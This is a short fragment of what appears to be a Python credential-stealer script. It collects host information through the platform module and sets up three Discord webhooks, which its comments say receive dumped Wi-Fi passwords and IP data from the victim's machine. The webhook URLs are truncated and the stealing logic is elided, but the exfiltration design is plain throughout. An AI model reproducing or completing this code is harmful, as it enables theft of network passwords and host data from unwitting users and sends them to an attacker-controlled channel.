...
trust = halal.uname() #using the platform module grabs usefull info about host pc.
...
Wbhook_wifi = Webhook("https://discord.com/api/webhooks/")#wifipass gets dumped here
Wbhook_nowifi = Webhook("https://discord.com/api/webhooks/") #nowifipass get dumped here
Wbhook_ip = Webhook("https://discord.com/api/webhooks/") #ip data gets dumped here( using discord as a platform)
